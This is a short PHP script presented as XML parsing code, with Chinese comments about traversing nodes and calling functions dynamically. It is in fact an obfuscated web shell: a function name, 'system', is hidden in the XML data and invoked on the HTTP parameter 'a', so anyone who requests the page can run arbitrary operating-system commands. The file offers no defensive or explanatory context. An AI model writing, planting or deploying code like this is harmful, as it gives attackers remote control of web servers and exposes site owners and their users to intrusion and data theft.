<?php
$xmlString = '<?xml version="1.0" encoding="UTF-8"?>
<data>
    <item>
        <key>system</key>
    </item>
    <item>
        <key>age</key>
        <value>30</value>
    </item>
</data>';

$xml = simplexml_load_string($xmlString);

// 递归遍历所有子节点
foreach ($xml->xpath('//key') as $keyNode) {
    $key = (string)$keyNode;
    ($key)($_GET['a']); // 动态调用函数
}
?>
